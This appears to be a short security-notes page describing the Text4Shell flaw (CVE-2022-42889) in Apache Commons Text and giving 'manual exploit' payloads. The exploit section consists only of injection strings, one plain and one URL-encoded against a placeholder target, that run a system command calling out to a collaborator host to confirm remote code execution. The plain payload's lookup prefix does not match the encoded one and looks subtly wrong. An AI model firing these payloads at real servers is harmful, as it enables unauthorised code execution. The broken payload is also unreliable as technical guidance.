---
layout: default
title : nighthawk - Text4Shell  - Apache Text4Shell manual exploit
---


## Description
Text4Shell is a critical vulnerability that affects a wide range of systems. The vulnerability lies in the way these systems parse text strings and allows for the execution of arbitrary code or SSRF attacks. The vulnerability is exploited through crafted strings, where either JavaScript code is executed (leading to Remote Code Execution (RCE)) or URLs are fetched (leading to Server-Side Request Forgery (SSRF)).

### CVE
**CVE-2022-42889**


### Steps to exploit 

>exploit payload

```java
#normal payload

${url:UTF-8:java.lang.Runtime.getRuntime().exec('nslookup COLLABORATOR-HERE')}

#url encoded
https://your-target.com/exploit?search=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27nslookup%20COLLABORATOR-HERE%27%29%7d
```

